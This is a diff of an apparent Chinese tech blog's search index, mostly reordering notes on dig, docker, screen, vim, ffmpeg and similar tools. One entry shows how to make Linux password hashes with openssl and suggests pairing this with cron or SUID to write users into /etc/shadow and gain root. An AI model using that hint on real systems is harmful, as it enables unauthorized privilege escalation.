@@ -145,16 +145,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Dns服务相关</title>
-    <url>/Dns%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
-    <content><![CDATA[<h4 id="dig命令">dig命令</h4>
-<p>显示域名详细信息,所有记录 以前的方式是全量区域传送,但是大部分域名服务器经过配置已经不允许区域传送,所以使用如下命令 <code>dig -t ANY +noall +multiline +answer 域名 @DNS服务器</code> 全量区域传送方式: <code>dig -t AXFR 域名 @DNS服务器</code> 反向解析 <code>dig -x ip地址 @DNS服务器</code></p>
-]]></content>
-      <categories>
-        <category>运维</category>
-      </categories>
-  </entry>
-  <entry>
     <title>51例程</title>
     <url>/51%E4%BE%8B%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="背景知识">背景知识</h2>
@@ -180,6 +170,16 @@
 ]]></content>
       <categories>
         <category>ARM</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Dns服务相关</title>
+    <url>/Dns%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
+    <content><![CDATA[<h4 id="dig命令">dig命令</h4>
+<p>显示域名详细信息,所有记录 以前的方式是全量区域传送,但是大部分域名服务器经过配置已经不允许区域传送,所以使用如下命令 <code>dig -t ANY +noall +multiline +answer 域名 @DNS服务器</code> 全量区域传送方式: <code>dig -t AXFR 域名 @DNS服务器</code> 反向解析 <code>dig -x ip地址 @DNS服务器</code></p>
+]]></content>
+      <categories>
+        <category>运维</category>
       </categories>
   </entry>
   <entry>
@@ -604,15 +604,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Linux-文件转二进制输出</title>
-    <url>/Linux-%E6%96%87%E4%BB%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BE%93%E5%87%BA/</url>
-    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxd -b ctf_chache/ZipCenOp.jar | cut -d <span class="string">&quot; &quot;</span> -f2-7 | sed -e <span class="string">&#x27;s/ //g&#x27;</span> -e <span class="string">&#x27;:a;N;$!ba;s/\n//g&#x27;</span> | sed <span class="string">&#x27;s/ //g&#x27;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>linux技术</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Linux-命令缩写及含义</title>
     <url>/Linux-%E5%91%BD%E4%BB%A4%E7%BC%A9%E5%86%99%E5%8F%8A%E5%90%AB%E4%B9%89/</url>
     <content><![CDATA[<h4 id="命令缩写">命令缩写:</h4>
@@ -881,6 +872,15 @@
       </categories>
   </entry>
   <entry>
+    <title>Linux-文件转二进制输出</title>
+    <url>/Linux-%E6%96%87%E4%BB%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BE%93%E5%87%BA/</url>
+    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxd -b ctf_chache/ZipCenOp.jar | cut -d <span class="string">&quot; &quot;</span> -f2-7 | sed -e <span class="string">&#x27;s/ //g&#x27;</span> -e <span class="string">&#x27;:a;N;$!ba;s/\n//g&#x27;</span> | sed <span class="string">&#x27;s/ //g&#x27;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>linux技术</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Linux文件夹详解</title>
     <url>/Linux-%E6%A0%B9%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
     <content><![CDATA[<h4 id="linux根目录下各个系统文件夹的含义和用途">Linux根目录"/"下各个系统文件夹的含义和用途</h4>
@@ -989,16 +989,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Linux学习-链接汇总</title>
-    <url>/Linux%E5%AD%A6%E4%B9%A0-%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/</url>
-    <content><![CDATA[<h3 id="传送门">传送门</h3>
-<p><a href="http://c.biancheng.net/linux_tutorial/">C语言中文网-Linux</a> <a href="http://c.biancheng.net/cpp/shell/">C语言中文网-Shell</a> <a href="https://www.leolan.top/index.php/posts/74.html">当用户模式修改密码</a></p>
-]]></content>
-      <categories>
-        <category>链接</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Linux-路由添加</title>
     <url>/Linux-%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0/</url>
     <content><![CDATA[<h2 id="网络配置">网络配置</h2>
@@ -1030,10 +1020,10 @@
       </categories>
   </entry>
   <entry>
-    <title>Thunderbird配置自动代理PAC</title>
-    <url>/Thunderbird%E9%85%8D%E7%BD%AE%E8%87%AA%E5%8A%A8%E4%BB%A3%E7%90%86PAC/</url>
-    <content><![CDATA[<h3 id="自动配置代理链接">自动配置代理链接</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;prudent-travels.000webhostapp.com&#x2F;pac.php?a&#x3D;SOCKS5&amp;b&#x3D;127.0.0.1:10808</span><br></pre></td></tr></table></figure>
+    <title>Linux学习-链接汇总</title>
+    <url>/Linux%E5%AD%A6%E4%B9%A0-%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h3 id="传送门">传送门</h3>
+<p><a href="http://c.biancheng.net/linux_tutorial/">C语言中文网-Linux</a> <a href="http://c.biancheng.net/cpp/shell/">C语言中文网-Shell</a> <a href="https://www.leolan.top/index.php/posts/74.html">当用户模式修改密码</a></p>
 ]]></content>
       <categories>
         <category>链接</category>
@@ -1053,6 +1043,16 @@
 ]]></content>
       <categories>
         <category>answer&amp;question</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Thunderbird配置自动代理PAC</title>
+    <url>/Thunderbird%E9%85%8D%E7%BD%AE%E8%87%AA%E5%8A%A8%E4%BB%A3%E7%90%86PAC/</url>
+    <content><![CDATA[<h3 id="自动配置代理链接">自动配置代理链接</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;prudent-travels.000webhostapp.com&#x2F;pac.php?a&#x3D;SOCKS5&amp;b&#x3D;127.0.0.1:10808</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>链接</category>
       </categories>
   </entry>
   <entry>
@@ -1182,6 +1182,46 @@
       </categories>
   </entry>
   <entry>
+    <title>docker-笔记</title>
+    <url>/docker-%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="docker-笔记">docker-笔记</h1>
+<h4 id="概念">概念</h4>
+<blockquote>
+<p>你从仓库里pull的文件叫做镜像，只可读，不可写 当你执行<strong>docker run</strong>的时候，系统会创建一个容器，而他是可读可写的，所有的修改都是建立在容器层上 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">└── 只读层-镜像</span><br><span class="line">    └──可读可写层-容器</span><br></pre></td></tr></table></figure> - 为了方便数据共享 所以形成了镜像与容器的概念 - 即使你修改了docker中的文件,被修改的也只是<strong>容器</strong>层，只读层 不会发生任何改变，所以可以镜像复用 - 当exit结束docker中的交互式shell后,容器的内容仍会保留(可以指定docker -rm 指定镜像启动的容器 来删除容器内的修改)</p>
+</blockquote>
+<p>由于 <strong>union fs</strong>结构 使镜象中的层可以像动态链接库一样继承,复用 <span id="more"></span></p>
+<hr />
+<h4 id="命令">命令</h4>
+<p>拉取镜像 <strong>pull</strong></p>
+<p><code>$ docker pull ubuntu:16.04</code></p>
+<p>运行镜像 <strong>run</strong></p>
+<p><code>$ docker run -it --rm ubuntu:16.04 bash</code> <code>$ docker run --name webserver -d -p 80:80 nginx</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">相关参数:</span><br><span class="line">--name: 命名</span><br><span class="line">--rm: 这个参数是说容器退出后随之将其删除</span><br><span class="line">-i:	交互式操作</span><br><span class="line">-t:	终端</span><br><span class="line">-d: 后台运行</span><br><span class="line">bash:所运行的命令</span><br></pre></td></tr></table></figure>
+<p>列出镜像 <strong>image ls</strong> <code>$ docker image ls</code></p>
+<p>删除虚悬镜像 <strong>image prune</strong> <code>$ docker image prune</code></p>
+<p>中间层镜像 <strong>image ls -a</strong> <code>$ docker image ls -a</code></p>
+<p>删除本地镜像 <strong>image rm</strong> <code>$ docker image rm [选项] &lt;镜像1&gt;</code> <code>$ docker image rm 501(根据id删除镜像文件,一般取前三位)</code></p>
+<p>进入容器 <strong>exec</strong> <code>$ docker exec -it webserver bash</code></p>
+<p>查看后台容器 <strong>container ls</strong> <code>$ docker container ls</code></p>
+<p>查看所有容器 <strong>container ls -a</strong> <code>$ docker container ls -a</code></p>
+<p>附加到后台容器 <strong>attatch</strong> <code>$ docker attatch [container id]</code></p>
+<p>容器保存为镜像的命令 <strong>commit</strong> <code>docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></p>
+<p>docker network 查看docker的网络信息</p>
+<p>docker port 查看端口</p>
+<p>docker logs -f 跟踪查看容器日志</p>
+<p>自定义docker0网桥信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;docker&#x2F;daemon.json</span><br><span class="line">&#123;</span><br><span class="line">	&quot;bip&quot;:&quot;192.168.1.5&#x2F;24&quot;, &#x2F;&#x2F;bridge ip</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="docker-run---network-参数">docker run --network 参数</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">container:容器名 &#x2F;&#x2F;与其他容器共享网络命名空间 </span><br><span class="line">host &#x2F;&#x2F;与宿主机共享网络命名空间</span><br><span class="line">none &#x2F;&#x2F;无网卡的网络命名空间，只有一个lo本地回环</span><br><span class="line">bridge &#x2F;&#x2F;桥接，可以通过-p来向外映射端口</span><br></pre></td></tr></table></figure>
+<hr />
+<h2 id="dockerfile-编写">dockerfile 编写</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令:</span><br><span class="line">    RUN	执行命令</span><br><span class="line">    COPY 复制文件</span><br><span class="line">    FROM 指定基础镜像</span><br><span class="line">    ADD 更高级的复制文件</span><br><span class="line">    CMD 容器启动命令</span><br><span class="line">    ENTRYPOINT 入口点</span><br><span class="line">    ENV 设置环境变量</span><br><span class="line">    ARG 构建参数</span><br><span class="line">    VOLUME 定义匿名卷</span><br><span class="line">    EXPOSE 声明端口</span><br><span class="line">    WORKDIR 指定工作目录</span><br><span class="line">    USER 指定当前用户</span><br><span class="line">    HEALTHCHECK 健康检查</span><br><span class="line">首先写出一个Dockerfile</span><br><span class="line">	$ docker build -t 镜像名:标签 .(点代表当前目录,由于docker上传Dockermakefile到服务端,形成了上下文概念,所以要使用相对路径,不可以使用绝对路径,因为绝对路径会超出上下文的管理范围)</span><br><span class="line">	cat Dockerfile | docker build -</span><br><span class="line">	##如果标准输入传入的是文本文件，则将其视为 Dockerfile，并开始构建。这种形式由于直接从标准输入中读取 Dockerfile 的内容，它没有上下文，因此不可以像其他方法那样可以将本地文件 COPY 进镜像之类的事情</span><br><span class="line">	</span><br><span class="line">	COPY 指令将从构建上下文目录中 &lt;源路径&gt; 的文件&#x2F;目录复制到新的一层的镜像内的 &lt;目标路径&gt; 位置。比如：</span><br><span class="line">	COPY package.json &#x2F;usr&#x2F;src&#x2F;app&#x2F;##上下文路径中,只能使用相对路径,因为会上传当前目录所有文件到上下文目录中,所以只能当前目录的相对路径,指定其他路径超出上下文目录管理范围</span><br><span class="line">	</span><br><span class="line">	ENTRYPOINT 是默认执行的，不会被替换掉</span><br><span class="line">	CMD可能会被docker run 镜像名 参数，替换掉</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>运维</category>
+      </categories>
+  </entry>
+  <entry>
     <title>bind9-笔记</title>
     <url>/bind9-%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="bind9">bind9</h1>
@@ -1235,44 +1275,10 @@
       </categories>
   </entry>
   <entry>
-    <title>docker-笔记</title>
-    <url>/docker-%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="docker-笔记">docker-笔记</h1>
-<h4 id="概念">概念</h4>
-<blockquote>
-<p>你从仓库里pull的文件叫做镜像，只可读，不可写 当你执行<strong>docker run</strong>的时候，系统会创建一个容器，而他是可读可写的，所有的修改都是建立在容器层上 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">└── 只读层-镜像</span><br><span class="line">    └──可读可写层-容器</span><br></pre></td></tr></table></figure> - 为了方便数据共享 所以形成了镜像与容器的概念 - 即使你修改了docker中的文件,被修改的也只是<strong>容器</strong>层，只读层 不会发生任何改变，所以可以镜像复用 - 当exit结束docker中的交互式shell后,容器的内容仍会保留(可以指定docker -rm 指定镜像启动的容器 来删除容器内的修改)</p>
-</blockquote>
-<p>由于 <strong>union fs</strong>结构 使镜象中的层可以像动态链接库一样继承,复用 <span id="more"></span></p>
-<hr />
-<h4 id="命令">命令</h4>
-<p>拉取镜像 <strong>pull</strong></p>
-<p><code>$ docker pull ubuntu:16.04</code></p>
-<p>运行镜像 <strong>run</strong></p>
-<p><code>$ docker run -it --rm ubuntu:16.04 bash</code> <code>$ docker run --name webserver -d -p 80:80 nginx</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">相关参数:</span><br><span class="line">--name: 命名</span><br><span class="line">--rm: 这个参数是说容器退出后随之将其删除</span><br><span class="line">-i:	交互式操作</span><br><span class="line">-t:	终端</span><br><span class="line">-d: 后台运行</span><br><span class="line">bash:所运行的命令</span><br></pre></td></tr></table></figure>
-<p>列出镜像 <strong>image ls</strong> <code>$ docker image ls</code></p>
-<p>删除虚悬镜像 <strong>image prune</strong> <code>$ docker image prune</code></p>
-<p>中间层镜像 <strong>image ls -a</strong> <code>$ docker image ls -a</code></p>
-<p>删除本地镜像 <strong>image rm</strong> <code>$ docker image rm [选项] &lt;镜像1&gt;</code> <code>$ docker image rm 501(根据id删除镜像文件,一般取前三位)</code></p>
-<p>进入容器 <strong>exec</strong> <code>$ docker exec -it webserver bash</code></p>
-<p>查看后台容器 <strong>container ls</strong> <code>$ docker container ls</code></p>
-<p>查看所有容器 <strong>container ls -a</strong> <code>$ docker container ls -a</code></p>
-<p>附加到后台容器 <strong>attatch</strong> <code>$ docker attatch [container id]</code></p>
-<p>容器保存为镜像的命令 <strong>commit</strong> <code>docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></p>
-<p>docker network 查看docker的网络信息</p>
-<p>docker port 查看端口</p>
-<p>docker logs -f 跟踪查看容器日志</p>
-<p>自定义docker0网桥信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;docker&#x2F;daemon.json</span><br><span class="line">&#123;</span><br><span class="line">	&quot;bip&quot;:&quot;192.168.1.5&#x2F;24&quot;, &#x2F;&#x2F;bridge ip</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="docker-run---network-参数">docker run --network 参数</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">container:容器名 &#x2F;&#x2F;与其他容器共享网络命名空间 </span><br><span class="line">host &#x2F;&#x2F;与宿主机共享网络命名空间</span><br><span class="line">none &#x2F;&#x2F;无网卡的网络命名空间，只有一个lo本地回环</span><br><span class="line">bridge &#x2F;&#x2F;桥接，可以通过-p来向外映射端口</span><br></pre></td></tr></table></figure>
-<hr />
-<h2 id="dockerfile-编写">dockerfile 编写</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令:</span><br><span class="line">    RUN	执行命令</span><br><span class="line">    COPY 复制文件</span><br><span class="line">    FROM 指定基础镜像</span><br><span class="line">    ADD 更高级的复制文件</span><br><span class="line">    CMD 容器启动命令</span><br><span class="line">    ENTRYPOINT 入口点</span><br><span class="line">    ENV 设置环境变量</span><br><span class="line">    ARG 构建参数</span><br><span class="line">    VOLUME 定义匿名卷</span><br><span class="line">    EXPOSE 声明端口</span><br><span class="line">    WORKDIR 指定工作目录</span><br><span class="line">    USER 指定当前用户</span><br><span class="line">    HEALTHCHECK 健康检查</span><br><span class="line">首先写出一个Dockerfile</span><br><span class="line">	$ docker build -t 镜像名:标签 .(点代表当前目录,由于docker上传Dockermakefile到服务端,形成了上下文概念,所以要使用相对路径,不可以使用绝对路径,因为绝对路径会超出上下文的管理范围)</span><br><span class="line">	cat Dockerfile | docker build -</span><br><span class="line">	##如果标准输入传入的是文本文件，则将其视为 Dockerfile，并开始构建。这种形式由于直接从标准输入中读取 Dockerfile 的内容，它没有上下文，因此不可以像其他方法那样可以将本地文件 COPY 进镜像之类的事情</span><br><span class="line">	</span><br><span class="line">	COPY 指令将从构建上下文目录中 &lt;源路径&gt; 的文件&#x2F;目录复制到新的一层的镜像内的 &lt;目标路径&gt; 位置。比如：</span><br><span class="line">	COPY package.json &#x2F;usr&#x2F;src&#x2F;app&#x2F;##上下文路径中,只能使用相对路径,因为会上传当前目录所有文件到上下文目录中,所以只能当前目录的相对路径,指定其他路径超出上下文目录管理范围</span><br><span class="line">	</span><br><span class="line">	ENTRYPOINT 是默认执行的，不会被替换掉</span><br><span class="line">	CMD可能会被docker run 镜像名 参数，替换掉</span><br></pre></td></tr></table></figure>
+    <title>ffmpeg批量切片</title>
+    <url>/ffmpeg%E6%89%B9%E9%87%8F%E5%88%87%E7%89%87/</url>
+    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `ls -l | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | grep <span class="string">&quot;mp4&quot;</span>`;<span class="keyword">do</span> ffmpeg -i <span class="variable">$i</span> -c copy -map 0 -f segment -segment_list `<span class="built_in">echo</span> <span class="variable">$&#123;i&#125;</span> | awk -F <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`.m3u8 -segment_time 20 `<span class="built_in">echo</span> <span class="variable">$&#123;i&#125;</span> | awk -F <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`-%05d.ts; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 ]]></content>
-      <categories>
-        <category>运维</category>
-      </categories>
   </entry>
   <entry>
     <title>freemat使用说明</title>
@@ -1547,6 +1553,19 @@
       </categories>
   </entry>
   <entry>
+    <title>java-流</title>
+    <url>/java-%E6%B5%81/</url>
+    <content><![CDATA[<h2 id="文件操作">文件操作</h2>
+<p>文件字节流：FileInputStream,FileOutputStream</p>
+<p>文件字符流：FileReader,FileWriter</p>
+<h3 id="inputstreamreader解码">InputStreamReader：解码</h3>
+<h3 id="outputstreamwriter编码">OutputStreamWriter：编码</h3>
+]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ip命令</title>
     <url>/ip%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="ip命令">ip命令</h2>
@@ -1563,19 +1582,6 @@
 <p>ip route,路由相关命令</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip route </span><br><span class="line">ip route add </span><br><span class="line">//添加默认路由，到网络的路由，到主机的路由</span><br><span class="line">	ip route add via gateway dev DEVICE</span><br><span class="line">	ip route add ip/mask via gateway dev DEVICE</span><br><span class="line">	ip route add ipaddr via gateway dev DEVICE</span><br><span class="line">//删除默认路由，到网络的路由，到主机的路由</span><br><span class="line">ip route del ip</span><br><span class="line">	ip route del via gateway dev DEVICE</span><br><span class="line">	ip route del ipaddr via gateway dev DEVICE</span><br><span class="line">	ip route del ipaddr via gateway dev DEVICE</span><br></pre></td></tr></table></figure>
 ]]></content>
-  </entry>
-  <entry>
-    <title>java-流</title>
-    <url>/java-%E6%B5%81/</url>
-    <content><![CDATA[<h2 id="文件操作">文件操作</h2>
-<p>文件字节流：FileInputStream,FileOutputStream</p>
-<p>文件字符流：FileReader,FileWriter</p>
-<h3 id="inputstreamreader解码">InputStreamReader：解码</h3>
-<h3 id="outputstreamwriter编码">OutputStreamWriter：编码</h3>
-]]></content>
-      <categories>
-        <category>编程</category>
-      </categories>
   </entry>
   <entry>
     <title>latex常用技巧</title>
@@ -1765,17 +1771,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>openssl-手动生成linux密码</title>
-    <url>/openssl-%E6%89%8B%E5%8A%A8%E7%94%9F%E6%88%90linux%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h4 id="openssl生成linux密码">openssl生成linux密码</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="string">&#x27;12345678&#x27;</span>  <span class="comment">#-1:表示采用的是MD5加密算法。 --salt:表示使用指定盐值</span></span><br><span class="line">Password:   <span class="comment">##这里输入的是密码</span></span><br></pre></td></tr></table></figure>
-<h3 id="可以结合cron定时计划suid实现任意添加用户到etcshadow文件指定uidgid等.达到获取最高权限的目的.">可以结合cron定时计划/suid实现任意添加用户到/etc/shadow文件,指定uid,gid等.达到获取最高权限的目的.</h3>
-]]></content>
-      <categories>
-        <category>linux工具</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pacman-常用指令</title>
     <url>/pacman-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
     <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S //从远程源获取并安装 相当于 apt install</span><br><span class="line">pacman -Syu //滚动升级、升级系统 相当于 apt upgrade &amp;&amp; apt dist-upgrade</span><br><span class="line">pacman -Rsc //卸载软件及其依赖 相当于 apt remove </span><br><span class="line">pacman -R //只卸载软件本体，不卸载依赖</span><br><span class="line">pacman -R $(pacman -Qqdt) //查找无用依赖并卸载  用于只删除软件包忘记删除赖时使用，当没有无用依赖，会返回一个error，代表删除完毕</span><br></pre></td></tr></table></figure>
@@ -1785,11 +1780,11 @@
       </categories>
   </entry>
   <entry>
-    <title>screen-笔记</title>
-    <url>/screen-%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h4 id="常用参数">常用参数</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br><span class="line">在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。</span><br><span class="line">C-a ? -&gt; Help，显示简单说明</span><br><span class="line">C-a c -&gt; Create，开启新的 window</span><br><span class="line">C-a n -&gt; Next，切换到下个 window </span><br><span class="line">C-a p -&gt; Previous，前一个 window </span><br><span class="line">C-a 0..9 -&gt; 切换到第 0..9 个window</span><br><span class="line">Ctrl+a [Space] -&gt; 由視窗0循序換到視窗9</span><br><span class="line">C-a C-a -&gt; 在两个最近使用的 window 间切换</span><br><span class="line">C-a x -&gt; 锁住当前的 window，需用用户密码解锁</span><br><span class="line">C-a d -&gt; detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里    每个 window 内运行的 process (无论是前台&#x2F;后台)都在继续执行，即使 logout 也不影响。 </span><br><span class="line">C-a z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令則可回去。</span><br><span class="line">C-a w -&gt; Windows，列出已开启的 windows 有那些 </span><br><span class="line">C-a t -&gt; Time，显示当前时间，和系统的 load </span><br><span class="line">C-a K -&gt; kill window，强行关闭当前的 window</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="还是tmux好用">还是TMUX好用</h3>
+    <title>openssl-手动生成linux密码</title>
+    <url>/openssl-%E6%89%8B%E5%8A%A8%E7%94%9F%E6%88%90linux%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h4 id="openssl生成linux密码">openssl生成linux密码</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="string">&#x27;12345678&#x27;</span>  <span class="comment">#-1:表示采用的是MD5加密算法。 --salt:表示使用指定盐值</span></span><br><span class="line">Password:   <span class="comment">##这里输入的是密码</span></span><br></pre></td></tr></table></figure>
+<h3 id="可以结合cron定时计划suid实现任意添加用户到etcshadow文件指定uidgid等.达到获取最高权限的目的.">可以结合cron定时计划/suid实现任意添加用户到/etc/shadow文件,指定uid,gid等.达到获取最高权限的目的.</h3>
 ]]></content>
       <categories>
         <category>linux工具</category>
@@ -1808,6 +1803,17 @@
 ]]></content>
       <categories>
         <category>编程</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>screen-笔记</title>
+    <url>/screen-%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h4 id="常用参数">常用参数</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br><span class="line">在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。</span><br><span class="line">C-a ? -&gt; Help，显示简单说明</span><br><span class="line">C-a c -&gt; Create，开启新的 window</span><br><span class="line">C-a n -&gt; Next，切换到下个 window </span><br><span class="line">C-a p -&gt; Previous，前一个 window </span><br><span class="line">C-a 0..9 -&gt; 切换到第 0..9 个window</span><br><span class="line">Ctrl+a [Space] -&gt; 由視窗0循序換到視窗9</span><br><span class="line">C-a C-a -&gt; 在两个最近使用的 window 间切换</span><br><span class="line">C-a x -&gt; 锁住当前的 window，需用用户密码解锁</span><br><span class="line">C-a d -&gt; detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里    每个 window 内运行的 process (无论是前台&#x2F;后台)都在继续执行，即使 logout 也不影响。 </span><br><span class="line">C-a z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令則可回去。</span><br><span class="line">C-a w -&gt; Windows，列出已开启的 windows 有那些 </span><br><span class="line">C-a t -&gt; Time，显示当前时间，和系统的 load </span><br><span class="line">C-a K -&gt; kill window，强行关闭当前的 window</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="还是tmux好用">还是TMUX好用</h3>
+]]></content>
+      <categories>
+        <category>linux工具</category>
       </categories>
   </entry>
   <entry>
@@ -1855,15 +1861,6 @@
       </categories>
   </entry>
   <entry>
-    <title>sql注入-拼接注入</title>
-    <url>/sql%E6%B3%A8%E5%85%A5-%E6%8B%BC%E6%8E%A5%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>git泄露,用Git_Assemble拖下来 获得源码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-  </entry>
-  <entry>
     <title>thinkphp-安装使用</title>
     <url>/thinkphp-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h3 id="安装过程">安装过程</h3>
@@ -1884,14 +1881,12 @@
       </categories>
   </entry>
   <entry>
-    <title>vim忘记使用sudo</title>
-    <url>/vim%E5%BF%98%E8%AE%B0%E4%BD%BF%E7%94%A8sudo/</url>
-    <content><![CDATA[<h1 id="vim忘记使用sudo">vim忘记使用sudo</h1>
-<p>修改完文件后，进入命令模式</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:w !sudo tee %</span><br></pre></td></tr></table></figure>
+    <title>sql注入-拼接注入</title>
+    <url>/sql%E6%B3%A8%E5%85%A5-%E6%8B%BC%E6%8E%A5%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>git泄露,用Git_Assemble拖下来 获得源码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
-        <category>linux知识</category>
+        <category>writeup</category>
       </categories>
   </entry>
   <entry>
@@ -1901,6 +1896,17 @@
 ]]></content>
       <categories>
         <category>linux工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>vim忘记使用sudo</title>
+    <url>/vim%E5%BF%98%E8%AE%B0%E4%BD%BF%E7%94%A8sudo/</url>
+    <content><![CDATA[<h1 id="vim忘记使用sudo">vim忘记使用sudo</h1>
+<p>修改完文件后，进入命令模式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:w !sudo tee %</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>linux知识</category>
       </categories>
   </entry>
   <entry>
@@ -2065,6 +2071,21 @@
       </categories>
   </entry>
   <entry>
+    <title>在配置linux+php+vscode+xdebug时遇到的问题</title>
+    <url>/%E5%9C%A8%E9%85%8D%E7%BD%AElinux-php-vscode-xdebug%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>首先在用户配置json配置这个,用于显示默认配置 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;workbench.settings.useSplitJSON&quot;: true,</span><br></pre></td></tr></table></figure> ###　源形式</p>
+<p>安装对应版本的php(版本号)-dev,可以使用<code>phpize</code>命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install php版本号-dev</span><br></pre></td></tr></table></figure></p>
+<p>检查你是否使用fpm启动php,如果是fpm,请添加语句到fpm目录下的<code>php.ini</code></p>
